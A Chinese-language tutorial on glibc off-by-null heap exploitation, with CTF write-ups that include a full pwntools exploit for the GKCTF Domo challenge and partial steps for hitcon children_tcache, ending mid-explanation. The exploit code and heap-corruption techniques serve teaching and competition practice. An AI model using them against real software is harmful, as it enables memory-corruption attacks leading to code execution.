> 原文链接: https://www.anquanke.com//post/id/208407 


# Off by Null的前世今生


                                阅读量   
                                **194654**
                            
                        |
                        
                                                                                                                                    ![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)
                                                                                            



[![](https://p4.ssl.qhimg.com/t0199943568f72cd78e.jpg)](https://p4.ssl.qhimg.com/t0199943568f72cd78e.jpg)



## 0x01 写在前面

本文从`2.23`、`2.27`、`2.29`三个角度并结合实例阐述了`Off by Null`的利用方式。





## 0x02 Off-by-null 漏洞

顾名思义，这种漏洞是溢出一个空字节，这比`Off-by-one`漏洞的利用条件更为苛刻。

在`Off-by-one`漏洞中，我们通常是用它来构造`Heap Overlap`或是用来触发`unlink`。

这两种利用思路都需要先对堆块合并有了解。

### <a class="reference-link" name="%E5%90%91%E5%89%8D%E5%90%88%E5%B9%B6%E4%B8%8E%E5%90%91%E5%90%8E%E5%90%88%E5%B9%B6"></a>向前合并与向后合并

#### <a class="reference-link" name="%E5%90%91%E5%89%8D%E5%90%88%E5%B9%B6"></a>向前合并

```
/* consolidate forward */
if (!nextinuse) `{`
    unlink(av, nextchunk, bck, fwd);
    size += nextsize;
`}` else
    clear_inuse_bit_at_offset(nextchunk, 0);
```

若有一个`Chunk`(下称`P`)将被`free`，那么`Glibc`首先通过`P + P -&gt; size`取出其**物理相邻**的后一个`Chunk`(下称`BK`)，紧接着通过`BK + BK -&gt; size`取出与`BK`块**物理相邻**的后一个`Chunk`并首先检查其`prev_inuse`位，若此位为清除状态则证明`BK`为`freed`状态，若是，则进入下一步检查。
- 此时若证明`BK`是`allocated`状态，则将`BK`的`prev_inuse`位清除，然后直接执行`free`后返回。
接下来检查`BK`是不是`Top chunk`，若不是，将进入向前合并的流程。
- 此时若证明`BK`是`Top chunk`则将其和`P`进行合并。
向后合并流程如下：
- 让`BK`进入`unlink`函数
- 修改`P -&gt; size`为`P -&gt; size + BK -&gt; size`(以此来表示size大小上已经合并)
#### <a class="reference-link" name="%E5%90%91%E5%90%8E%E5%90%88%E5%B9%B6"></a>向后合并

```
/* consolidate backward */
if (!prev_inuse(p)) `{`
    prevsize = p-&gt;prev_size;
    size += prevsize;
    p = chunk_at_offset(p, -((long) prevsize));
    unlink(av, p, bck, fwd);
`}`
```

首先检查`P`的`prev_inuse`位是否为清除状态，若是，则进入向后合并的流程：
- 首先通过`P - P -&gt; prev_size`取出其**物理相邻**的前一个`Chunk`(下称`FD`)，
- 修改`P -&gt; size`为`P -&gt; size + FD -&gt; size`(以此来表示size大小上已经合并)
- 让`FD`进入`unlink`函数
### 构造`Heap Overlap`

我们在这里给出构造`Heap Overlap`的三种常见方式。
1. 通过`Off by One`漏洞来修改`Chunk`的`size`域涉及到`Glibc`堆管理机制中空间复用的相关知识，此处不再赘述。
<li>若内存中有如下布局(`Chunk B`、`Chunk C`均为`allocated`状态)：
<pre><code class="hljs diff">+++++++++++++++++++++++++++++++++++++++++++
|   Chunk A   |   Chunk B   |   Chunk C   |
+++++++++++++++++++++++++++++++++++++++++++
</code></pre>
我们在`Chunk A`处触发`Off-by-one`漏洞，将`Chunk B`的`size`域篡改为`Chunk B + Chunk C`的大小，然后释放`Chunk B`，再次取回，我们此时就可以对`Chunk C`的内容进行任意读写了。
⚠️：篡改`Chunk B`的`size`域时，仍要保持`prev_issue`位为`1`，以免触发堆块合并。
⚠️：篡改`Chunk B`的`size`域时，需要保证将`Chunk C`完全包含，否则将无法通过以下所述的验证。
<pre><code class="lang-c hljs cpp">// /glibc/glibc-2.23/source/malloc/malloc.c#L3985
/* Or whether the block is actually not marked used.  */
if (__glibc_unlikely (!prev_inuse(nextchunk)))
`{`
    errstr = "double free or corruption (!prev)";
    goto errout;
`}`
</code></pre>
</li>
<li>若内存中有如下布局(`Chunk B`为`freed`状态、`Chunk C`为`allocated`状态)：
<pre><code class="hljs diff">+++++++++++++++++++++++++++++++++++++++++++
|   Chunk A   |   Chunk B   |   Chunk C   |
+++++++++++++++++++++++++++++++++++++++++++
</code></pre>
我们在`Chunk A`处触发`Off-by-one`漏洞，将`Chunk B`的`size`域篡改为`Chunk B + Chunk C`的大小，然后取回`Chunk B`，我们此时就可以对`Chunk C`的内容进行任意读写了。
⚠️：篡改`Chunk B`的`size`域时，仍要保持`prev_issue`位为`1`，以免触发堆块合并。
⚠️：篡改`Chunk B`的`size`域时，需要保证将`Chunk C`完全包含，否则将无法通过验证。
</li>
<li>接下来是一种比较困难的构造方式，首先需要内存中是以下布局：
<pre><code class="hljs diff">+++++++++++++++++++++++++++++++++++++++++++
|   Chunk A   |   Chunk B   |   Chunk C   |
+++++++++++++++++++++++++++++++++++++++++++
</code></pre>
**其中要求，`Chunk A`的`prev_inuse`位置位，此时的三个`Chunk`均为`allocated`状态。**
我们申请时，要保证`Chunk C`的`size`域一定要是`0x100`的整倍数，那么我们首先释放`Chunk A`，再通过`Chunk B`触发`Off-by-null`，此时`Chunk C`的`prev_inuse`位被清除，同时构造`prev_size`为`Chunk A -&gt; size + Chunk B -&gt; size`，然后释放`Chunk_C`，此时因为`Chunk C`的`prev_inuse`位被清除，这会导致向后合并的发生，从而产生一个大小为`Chunk A`，`Chunk B`，`Chunk C`之和的`chunk`，再次取回后即可伪造`Chunk B`的结构。
</li>
#### <a class="reference-link" name="Glibc%202.27%20%E5%88%A9%E7%94%A8%E6%80%9D%E8%B7%AF"></a>Glibc 2.27 利用思路

### 触发`Unlink`

首先我们先来介绍一下`unlink`漏洞的发展过程。

#### <a class="reference-link" name="In%20Glibc%202.3.2(or%20&lt;%20Glibc%202.3.2)"></a>In Glibc 2.3.2(or &lt; Glibc 2.3.2)

首先，我们利用的重点是unlink函数(为了代码高亮，删除了结尾的换行符)

```
// In /glibc/glibc-2.3.2/source/malloc/malloc.c
/* Take a chunk off a bin list */
void unlink(P, BK, FD) `{`
    FD = P-&gt;fd;
    BK = P-&gt;bk;
    FD-&gt;bk = BK;
    BK-&gt;fd = FD;
`}`
```

可以发现，在远古版本的GLibc中，`Unlink`函数没有任何防护，直接就是简单的执行脱链操作，那么，一旦我们能控制`P`的`fd`域为`Fake_value`，`bk`域为`Addr - 3 * Size_t`，那么在那之后执行`BK-&gt;fd = FD`时将会实际执行`(Addr - 3 * Size_t) + 3 * Size_t =  Fake_value`进而完成任意地址写。

#### <a class="reference-link" name="In%20Glibc%202.23%EF%BC%88Ubuntu%2016.04%EF%BC%89"></a>In Glibc 2.23（Ubuntu 16.04）

```
// /glibc/glibc-2.23/source/malloc/malloc.c#L1414

/* Take a chunk off a bin list */
#define unlink(AV, P, BK, FD) `{`
    FD = P-&gt;fd;
    BK = P-&gt;bk;
    if (__builtin_expect (FD-&gt;bk != P || BK-&gt;fd != P, 0))
        malloc_printerr (check_action, "corrupted double-linked list", P, AV);
    else `{`
        FD-&gt;bk = BK;
        BK-&gt;fd = FD;
        if (!in_smallbin_range (P-&gt;size)
            &amp;&amp; __builtin_expect (P-&gt;fd_nextsize != NULL, 0)) `{`
            if (__builtin_expect (P-&gt;fd_nextsize-&gt;bk_nextsize != P, 0)
                || __builtin_expect (P-&gt;bk_nextsize-&gt;fd_nextsize != P, 0)) 
                malloc_printerr (check_action,
                                 "corrupted double-linked list (not small)",
                                 P, AV);
            if (FD-&gt;fd_nextsize == NULL) `{`
                if (P-&gt;fd_nextsize == P)
                    FD-&gt;fd_nextsize = FD-&gt;bk_nextsize = FD;
                else `{`
                    FD-&gt;fd_nextsize = P-&gt;fd_nextsize;
                    FD-&gt;bk_nextsize = P-&gt;bk_nextsize;
                    P-&gt;fd_nextsize-&gt;bk_nextsize = FD;
                    P-&gt;bk_nextsize-&gt;fd_nextsize = FD;
                `}`
            `}` else `{`
                P-&gt;fd_nextsize-&gt;bk_nextsize = P-&gt;bk_nextsize;
                P-&gt;bk_nextsize-&gt;fd_nextsize = P-&gt;fd_nextsize;
            `}`
        `}`
    `}`
`}`
```

在`Glibc 2.23`中，加入了两个检查，一个是在执行实际脱链操作前的链表完整性检查。

```
if (__builtin_expect (FD-&gt;bk != P || BK-&gt;fd != P, 0))
        malloc_printerr (check_action, "corrupted double-linked list", P, AV);
```

这里就是就是检查`(P -&gt; fd) -&gt; bk == P == (P -&gt; bk) -&gt; fd`，若我们能得到`P`的地址位置，如假设`P`的地址存储在`BSS`段中的`Chunk_addr`处，那么我们篡改`P -&gt; fd`为`Chunk_addr - 4 * Size_t`，`P -&gt; bk`为`Chunk_addr - 3 * Size_t`。那么在进行检查时将会产生怎样的效果呢：

```
Chunk_addr - 4 * Size_t + 4 * Size_t == Chunk_addr == Chunk_addr - 3 * Size_t + 3 * Size_t
```

显然成立！

那么这样改会产生怎样的攻击效果呢？我们继续看，在执行实际脱链操作后：

```
Chunk_addr - 4 * Size_t + 4 * Size_t = Chunk_addr - 3 * Size_t (实际未生效)
Chunk_addr - 3 * Size_t + 3 * Size_t = Chunk_addr - 4 * Size_t
```

也就是`Chunk_addr = Chunk_addr - 4 * Size_t`，若还有其他的`Chunk`地址在`Chunk_addr`周围，我们就可以直接攻击对应项，如果程序存在读写`Chunk`的函数且没有额外的`Chunk`结构验证，我们就可以进行任意地址读写了。

### <a class="reference-link" name="Glibc%202.27(Ubuntu%2018.04)%E7%9A%84%E6%96%B0%E5%8F%98%E5%8C%96"></a>Glibc 2.27(Ubuntu 18.04)的新变化

#### <a class="reference-link" name="%E5%90%88%E5%B9%B6%E6%93%8D%E4%BD%9C%E5%8F%98%E5%8C%96"></a>合并操作变化

```
/* consolidate backward */
if (!prev_inuse(p)) `{`
    prevsize = prev_size (p);
    size += prevsize;
    p = chunk_at_offset(p, -((long) prevsize));
    unlink(av, p, bck, fwd);
`}`
/* consolidate forward */
if (!nextinuse) `{`
    unlink(av, nextchunk, bck, fwd);
    size += nextsize;
`}` else
    clear_inuse_bit_at_offset(nextchunk, 0);
```

可以发现，就合并操作而言，并没有什么新的保护措施。

#### `Unlink`内部变化

```
// In /glibc/glibc-2.27/source/malloc/malloc.c#L1404

/* Take a chunk off a bin list */
#define unlink(AV, P, BK, FD) `{`
    if (__builtin_expect (chunksize(P) != prev_size (next_chunk(P)), 0))
        malloc_printerr ("corrupted size vs. prev_size");
    FD = P-&gt;fd;
    BK = P-&gt;bk;
    if (__builtin_expect (FD-&gt;bk != P || BK-&gt;fd != P, 0))
        malloc_printerr ("corrupted double-linked list");
    else `{`
        FD-&gt;bk = BK;
        BK-&gt;fd = FD;
        if (!in_smallbin_range (chunksize_nomask (P))
            &amp;&amp; __builtin_expect (P-&gt;fd_nextsize != NULL, 0)) `{`
            if (__builtin_expect (P-&gt;fd_nextsize-&gt;bk_nextsize != P, 0)
                || __builtin_expect (P-&gt;bk_nextsize-&gt;fd_nextsize != P, 0))
                malloc_printerr ("corrupted double-linked list (not small)");
            if (FD-&gt;fd_nextsize == NULL) `{`
                if (P-&gt;fd_nextsize == P)
                    FD-&gt;fd_nextsize = FD-&gt;bk_nextsize = FD;
                else `{`
                    FD-&gt;fd_nextsize = P-&gt;fd_nextsize;
                    FD-&gt;bk_nextsize = P-&gt;bk_nextsize;
                    P-&gt;fd_nextsize-&gt;bk_nextsize = FD;
                    P-&gt;bk_nextsize-&gt;fd_nextsize = FD;
                `}`
            `}` else `{`
                P-&gt;fd_nextsize-&gt;bk_nextsize = P-&gt;bk_nextsize;
                P-&gt;bk_nextsize-&gt;fd_nextsize = P-&gt;fd_nextsize;
            `}`
        `}`
    `}`
`}`
```

和`GLIBC 2.23`相比，最明显的是增加了关于`prev_size`的检查：

```
if (__builtin_expect (chunksize(P) != prev_size (next_chunk(P)), 0))
    malloc_printerr ("corrupted size vs. prev_size");
```

这一项会检查即将脱链的`chunk`的`size`域是否与他下一个`Chunk`的`prev_size`域相等，这一项检查事实上对向后合并的利用没有造成过多的阻碍，我们只需要提前将`chunk 0`进行一次释放即可：

```
1. 现在有 Chunk_0、Chunk_1、Chunk_2、Chunk_3。
2. 释放 Chunk_0 ，此时将会在 Chunk_1 的 prev_size 域留下 Chunk_0 的大小
3. 在 Chunk_1 处触发Off-by-null，篡改 Chunk_2 的 prev_size 域以及 prev_inuse位
4. Glibc 通过 Chunk_2 的 prev_size 域找到空闲的 Chunk_0 
5. 将 Chunk_0 进行 Unlink 操作，通过  Chunk_0 的 size 域找到 nextchunk 就是 Chunk_1 ，检查 Chunk_0 的 size 与 Chunk_1 的 prev_size 是否相等。
6. 由于第二步中已经在 Chunk_1 的 prev_size 域留下了 Chunk_0 的大小，因此，检查通过。
```

### <a class="reference-link" name="Glibc%202.29(Ubuntu%2019.04)%E7%9A%84%E6%96%B0%E5%8F%98%E5%8C%96"></a>Glibc 2.29(Ubuntu 19.04)的新变化

⚠️：由于`Ubuntu 19.04`是非LTS(Long Term Support，长期支持)版本，因此其软件源已经失效，因此若需要继续使用，需要把`apt`源修改为**`18.04`的软件源**，两个版本相互兼容。

#### <a class="reference-link" name="%E5%90%88%E5%B9%B6%E6%93%8D%E4%BD%9C%E5%8F%98%E5%8C%96"></a>合并操作变化

```
/* consolidate backward */
if (!prev_inuse(p)) `{`
    prevsize = prev_size (p);
    size += prevsize;
    p = chunk_at_offset(p, -((long) prevsize));
    if (__glibc_unlikely (chunksize(p) != prevsize))
        malloc_printerr ("corrupted size vs. prev_size while consolidating");
    unlink_chunk (av, p);
`}`

/* consolidate forward */
if (!nextinuse) `{`
    unlink_chunk (av, nextchunk);
    size += nextsize;
`}` else
    clear_inuse_bit_at_offset(nextchunk, 0);
```

可以发现，合并操作增加了新保护:

```
if (__glibc_unlikely (chunksize(p) != prevsize))
        malloc_printerr ("corrupted size vs. prev_size while consolidating");
```

这里注意，这和上文所述的`(chunksize(P) != prev_size (next_chunk(P))`是有本质区别的，这里的情况是：

```
1. 检查 prev_inuse 位是否置位，来决定是否触发向后合并。
2. 若触发，取出本 chunk 的 prev_size ，并根据 prev_size 找到要进行 unlink 的 chunk 。
3. 检查要进行 unlink 的 chunk 的 size 域是否与取出的 prev_size 相等。
```

#### `Unlink`内部变化

```
// In /glibc/glibc-2.29/source/malloc/malloc.c#L1460

/* Take a chunk off a bin list.  */
static void unlink_chunk (mstate av, mchunkptr p)
`{`
    if (chunksize (p) != prev_size (next_chunk (p)))
        malloc_printerr ("corrupted size vs. prev_size");

    mchunkptr fd = p-&gt;fd;
    mchunkptr bk = p-&gt;bk;

    if (__builtin_expect (fd-&gt;bk != p || bk-&gt;fd != p, 0))
        malloc_printerr ("corrupted double-linked list");

    fd-&gt;bk = bk;
    bk-&gt;fd = fd;
    if (!in_smallbin_range (chunksize_nomask (p)) &amp;&amp; p-&gt;fd_nextsize != NULL)
    `{`
        if (p-&gt;fd_nextsize-&gt;bk_nextsize != p || p-&gt;bk_nextsize-&gt;fd_nextsize != p)
            malloc_printerr ("corrupted double-linked list (not small)");

        if (fd-&gt;fd_nextsize == NULL)
        `{`
            if (p-&gt;fd_nextsize == p)
                fd-&gt;fd_nextsize = fd-&gt;bk_nextsize = fd;
            else
            `{`
                fd-&gt;fd_nextsize = p-&gt;fd_nextsize;
                fd-&gt;bk_nextsize = p-&gt;bk_nextsize;
                p-&gt;fd_nextsize-&gt;bk_nextsize = fd;
                p-&gt;bk_nextsize-&gt;fd_nextsize = fd;
            `}`
        `}`
        else
        `{`
            p-&gt;fd_nextsize-&gt;bk_nextsize = p-&gt;bk_nextsize;
            p-&gt;bk_nextsize-&gt;fd_nextsize = p-&gt;fd_nextsize;
        `}`
    `}`
`}`
```

和`GLIBC 2.27`相比，最明显的其实是整个宏定义被变更成了函数，其中的保护并没有发生更多的改变。

那么，事实上，真正对我们的利用产生阻碍的是之前合并操作变化，如果我们要继续完成利用，我们就需要修改 fake chunk 的 size 域，然而我们现在只有`Off-by-null`的利用条件是无法进行修改的，那么我们要利用就需要进行较为巧妙的堆布局构造，具体构造方式请查看例题。



## 0x03 以 2020 GKCTF Domo 为例

### <a class="reference-link" name="%E9%A2%98%E7%9B%AE%E4%BF%A1%E6%81%AF"></a>题目信息

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://img.lhyerror404.cn/error404/2020-05-26-025623.png)

保护全开，64位程序

### <a class="reference-link" name="%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90"></a>漏洞分析

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://img.lhyerror404.cn/error404/2020-05-26-025739.png)

创建`Chunk`时存在一个`off-by-null`漏洞

⚠️：注意，此处是恒定存在一个空字节溢出，并不是在我们的输入后面加一个空字节！

### <a class="reference-link" name="%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8"></a>漏洞利用

#### <a class="reference-link" name="%E6%B3%84%E9%9C%B2%E6%9C%89%E7%94%A8%E4%BF%A1%E6%81%AF"></a>泄露有用信息

首先需要泄露一些有用的地址值，例如`Libc`、`Heap Addr`等

```
creat(sh,0x100,'Chunk0')
creat(sh,0x100,'Chunk1')
creat(sh,0x40,'Chunk2')
creat(sh,0x40,'Chunk3')
creat(sh,0x100,'Chunk4')

delete(sh,0)
creat(sh,0x100,'Libc---&gt;')
show(sh,0)
libc.address = get_address(sh=sh,info='LIBC ADDRESS IS ',start_string='Libc---&gt;',end_string='x0A',offset=-0x3C4B78)

delete(sh,3)
delete(sh,2)
creat(sh,0x40,'H')
show(sh,2)
heap_address = get_address(sh=sh,info='HEAP ADDRESS IS ',start_string='n',address_len=6,offset=-0x1238)
```

⚠️：注意，由于恒定存在一个空字节溢出，会导致我们泄露结束后导致某些`Chunk`的`size`域损坏！

#### 构造`Heap Overlap`

这里我们首先申请三个Chunk：

```
creat(sh,0x100,'Chunk5')
creat(sh,0x68,'Chunk6')
creat(sh,0xF8,'Chunk7')
creat(sh,0x100,'Chunk8') # 用于防止最后一个Chunk被Top Chunk吞并
```

依次释放掉`chunk 5`和`chunk 6`，然后重新申请一个`chunk 6`，触发`Off-by-null`，清除`Chunk 7`的`prev_inuse`位，同时伪造`chunk 7`的`prev_size`为`0x100+0x10+0x68+0x8`，最后释放`chunk 7`。

```
delete(sh,5)
delete(sh,6)
creat(sh,0x68,'A'*0x60 + p64(0x70+0x110))
delete(sh,7)
creat(sh,0x270,'A') # Fake
```

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://img.lhyerror404.cn/error404/2020-05-26-103929.png)

#### <a class="reference-link" name="Fastbin%20Attack%20&amp;%20%E5%8A%AB%E6%8C%81%20vtable"></a>Fastbin Attack &amp; 劫持 vtable

接下来我们可以进行`Fastbin Attack`了，在这里我们决定使用篡改`_IO_2_1_stdin_`的`vtable`表的方式来完成利用

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://img.lhyerror404.cn/error404/2020-05-26-125146.png)

**⚠️：这里遇到了一个小坑，特此记录下，我们如果要使用`Fastbin Attack`，我们需要在目标地址的头部附加一个`size`，于是我们这里可以使用题目给出的任意地址写来完成，然鹅，我们若传入了一个不合法的地址(没有写权限)，`read`不会抛出异常，而是会直接跳过，那么我们的输入将会残存在缓冲区，而程序在`main`函数是使用`_isoc99_scanf("%d", &amp;usr_choice);`来读取选项的，这导致残存在缓冲区的字符无法被取出，程序将进入死循环！**

我们的核心还是去伪造`vtable`，但是很不幸的，由于`Glibc-2.23`的`vtable`已经加入了只读保护，但我们可以直接自己写一个`fake_vtable`然后直接让`IO`结构体的`vtable`指向我们的`fake_vtable`即可。

首先我们需要在`IO`结构体的上方写一个`size`以便我们进行`Fastbin_Attack`：

```
every_where_edit(sh,str(libc.symbols['_IO_2_1_stdin_'] - 0x8),'x71')
delete(sh,2)
creat(sh,0x120,'A' * 0x100 + p64(0x110) + p64(0x70) + p64(libc.symbols['_IO_2_1_stdin_'] - 0x10))
```

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://img.lhyerror404.cn/error404/2020-05-26-130335.png)

然后我们只需要伪造并劫持vtable即可

```
creat(sh,0x100,p64(0) * 2 + p64(libc.address + 0xf02a4) * 19 + p64(0) * 3)
creat(sh,0x60, 'Chunk')
creat(sh,0x60, p64(0xffffffff) + "x00" * 0x10 + p64(heap_address + 0x4E0))
```

### <a class="reference-link" name="Final%20Exploit"></a>Final Exploit

```
from pwn import *
import traceback
import sys
context.log_level='debug'
context.arch='amd64'
# context.arch='i386'

domo=ELF('./domo', checksec = False)

if context.arch == 'amd64':
    libc=ELF("/lib/x86_64-linux-gnu/libc.so.6", checksec = False)
elif context.arch == 'i386':
    try:
        libc=ELF("/lib/i386-linux-gnu/libc.so.6", checksec = False)
    except:
        libc=ELF("/lib32/libc.so.6", checksec = False)

def get_sh(Use_other_libc = False , Use_ssh = False):
    global libc
    if args['REMOTE'] :
        if Use_other_libc :
            libc = ELF("./", checksec = False)
        if Use_ssh :
            s = ssh(sys.argv[3],sys.argv[1], sys.argv[2],sys.argv[4])
            return s.process("./domo")
        else:
            return remote(sys.argv[1], sys.argv[2])
    else:
        return process("./domo")

def creat(sh,chunk_size,value):
    sh.recvuntil('&gt; ')
    sh.sendline('1')
    sh.recvuntil('size:n')
    sh.sendline(str(chunk_size))
    sh.recvuntil('content:n')
    sh.send(value)

def delete(sh,index):
    sh.recvuntil('&gt; ')
    sh.sendline('2')
    sh.recvuntil('index:n')
    sh.sendline(str(index))

def show(sh,index):
    sh.recvuntil('&gt; ')
    sh.sendline('3')
    sh.recvuntil('index:n')
    sh.sendline(str(index))

def every_where_edit(sh,vuln_addr,vuln_byte):
    sh.recvuntil('&gt; ')
    sh.sendline('4')
    sh.recvuntil('addr:n')
    sh.sendline(vuln_addr)
    sh.recvuntil('num:n')
    sh.send(vuln_byte)

def get_address(sh,info=None,start_string=None,address_len=None,end_string=None,offset=None,int_mode=False):
    if start_string != None:
        sh.recvuntil(start_string)
    if int_mode :
        return_address = int(sh.recvuntil(end_string,drop=True),16)
    elif address_len != None:
        return_address = u64(sh.recv()[:address_len].ljust(8,'x00'))
    elif context.arch == 'amd64':
        return_address=u64(sh.recvuntil(end_string,drop=True).ljust(8,'x00'))
    else:
        return_address=u32(sh.recvuntil(end_string,drop=True).ljust(4,'x00'))
    if offset != None:
        return_address = return_address + offset
    if info != None:
        log.success(info + str(hex(return_address)))
    return return_address

def get_flag(sh):
    sh.sendline('cat /flag')
    return sh.recvrepeat(0.3)

def get_gdb(sh,gdbscript=None,stop=False):
    gdb.attach(sh,gdbscript=gdbscript)
    if stop :
        raw_input()

def Multi_Attack():
    # testnokill.__main__()
    return

def Attack(sh=None,ip=None,port=None):
    if ip != None and port !=None:
        try:
            sh = remote(ip,port)
        except:
            return 'ERROR : Can not connect to target server!'
    try:
        # Your Code here
        creat(sh,0x40,'Chunk0')
        creat(sh,0x40,'Chunk1')
        creat(sh,0xF8,'Chunk2')
        creat(sh,0xF8,'Chunk3')
        creat(sh,0x100,'Chunk4')

        creat(sh,0x100,'Chunk5')
        creat(sh,0x68,'Chunk6')
        creat(sh,0xF8,'Chunk7')
        creat(sh,0x100,'Chunk8')

        delete(sh,2)
        delete(sh,0)
        delete(sh,1)
        creat(sh,0x40,'H')
        show(sh,0)
        heap_address = get_address(sh=sh,info='HEAP ADDRESS IS ',start_string='',address_len=6,offset=-0x28)

        sh.sendline('3')
        sh.recvuntil('index:')
        sh.sendline('0')

        delete(sh,3)
        creat(sh,0xF8,'Libc---&gt;')
        show(sh,1)
        libc.address = get_address(sh=sh,info='LIBC ADDRESS IS ',start_string='Libc---&gt;',end_string='x0A',offset=-0x3C4D68)

        delete(sh,5)
        delete(sh,6)
        creat(sh,0x68,'A'*0x60 + p64(0x70+0x110))
        delete(sh,7)

        every_where_edit(sh,str(libc.symbols['_IO_2_1_stdin_'] + 0xB8),'x71')
        delete(sh,2)
        creat(sh,0x120,'A' * 0x100 + p64(0x110) + p64(0x70) + p64(libc.symbols['_IO_2_1_stdin_'] + 0xB0))

        creat(sh,0x100,p64(0) * 2 + p64(libc.address + 0xf02a4) * 19 + p64(0) * 3)
        creat(sh,0x60, 'Chunk')
        creat(sh,0x60, p64(0xffffffff) + "x00" * 0x10 + p64(heap_address + 0x4E0))

        sh.interactive()
        flag = get_flag(sh)
        sh.close()
        return flag
    except Exception as e:
        traceback.print_exc()
        sh.close()
        return 'ERROR : Runtime error!'

if __name__ == "__main__":
    sh = get_sh()
    flag = Attack(sh=sh)
    log.success('The flag is ' + re.search(r'flag`{`.+`}`',flag).group())
```



## 0x04 以 hitcon_2018_children_tcache 为例

### <a class="reference-link" name="%E9%A2%98%E7%9B%AE%E4%BF%A1%E6%81%AF"></a>题目信息

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://img.lhyerror404.cn/error404/2020-06-10-064621.png)

保护全开，64位程序，Glibc-2.27

### <a class="reference-link" name="%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90"></a>漏洞分析

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://img.lhyerror404.cn/error404/2020-06-10-070331.png)

创建`Chunk`时，使用了`strcpy`函数，而这个函数会在将字符串转移后在末尾添加一个`x00`，因此此处存在一个`off-by-null`漏洞。

### <a class="reference-link" name="%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8"></a>漏洞利用

#### 构造`Heap Overlap`

首先，这个题目中可以发现允许申请大小超过`0x400`的`chunk`，那么我们申请的大块就可以免受`Tcache`的影响，那么我们首先申请三个`chunk`用于攻击：

```
creat(sh,0x480,'Chunk_0')
creat(sh,0x78 ,'Chunk_1')
creat(sh,0x4F0,'Chunk_2')
creat(sh,0x20 ,'Chunk_3') # 用于防止最后一个Chunk被Top Chunk吞并
```

依次释放掉`chunk 0`和`chunk 1`，然后我们理论上就应该取回`chunk 1`来触发`Off-by-null`了，但是，需要注意的是，此处的释放函数有`memset(note_list[idx], 0xDA, size_list[idx]);`，也就是说`xDA`将充斥整个数据空间，这会影响到我们后续的布置。

因此，我们先利用以下代码来清理`chunk 2`的`prev_size`域：

```
for i in range(9):
    creat(sh, 0x78 - i, 'A' * (0x78 - i))
    delete(sh,0)
```

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://img.lhyerror404.cn/error404/2020-06-10-074353.png)

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://img.lhyerror404.cn/error404/2020-06-10-074544.png)

清理完之后，取回`chunk 1`并触发`Off-by-Null`：

```
creat(sh,0x78,'B' * 0x70 + p64(0x480 + 0x10 + 0x70 + 0x10))
```

释放`Chunk 2`，`Heap Overlap`构造成功。

#### <a class="reference-link" name="Leak%20Libc"></a>Leak Libc

解下来申请一个和原来的`Chunk 0`大小相同的`Chunk`，`main_arena`的地址将会被推到`Chunk 1`的数据域，于是可以得到`libc`基址。

```
libc.address=get_address(sh=sh,info='LIBC ADDRESS --&gt; ',
                         start_string='',end_string='n',
                         offset=0x00007f77c161e000-0x7f77c1a09ca0)
```

#### <a class="reference-link" name="Double%20Free"></a>Double Free

接下来我们通过触发`Double Free`来完成利用，和原来的`Chunk 1`大小相同的`Chunk`，此时，下标`0`和`2`的`chunk`将指向同一块内存，而`Glibc 2.27`中没有对`Tcache`中`Double Free`的检查，故我们可以很方便的完成利用链构造：

